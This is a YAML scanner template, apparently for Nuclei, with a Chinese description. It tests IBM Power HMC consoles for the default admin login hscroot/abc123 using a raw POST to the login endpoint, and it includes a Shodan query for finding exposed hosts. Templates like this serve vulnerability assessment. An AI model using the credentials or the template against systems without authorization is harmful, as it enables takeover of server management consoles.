id: ibm-hmc-default-login

info:
  name: IBM Power HMC 默认口令登录（弱口令）
  author: R3S OST
  severity: high
  description: |
    该模板通过尝试 IBM Power HMC 的默认管理员账号口令，并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者通常可直接获得后台管理权限，进一步访问敏感信息、修改配置或执行未授权操作。
  reference:
    - https://www.ibm.com/docs/en/power8?topic=tools-hardware-management-console
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
  metadata:
    verified: true
    max-request: 1
    shodan-query: http.favicon.hash:262502857
  tags: default-login,ibm,hmc,vuln

http:
  - raw:
      - |
        POST /hmc/j_security_check HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        j_username={{username}}&j_password={{password}}&j_newConsole=Dashboard&j_security_check=Log+in

    payloads:
      username:
        - hscroot
      password:
        - abc123
    attack: pitchfork

    matchers:
      - type: dsl
        dsl:
          - "len(body) == 0"
          - "status_code == 303"
          - "contains(header, 'Location: /hmc/connect;jsessionid=')"
        condition: and
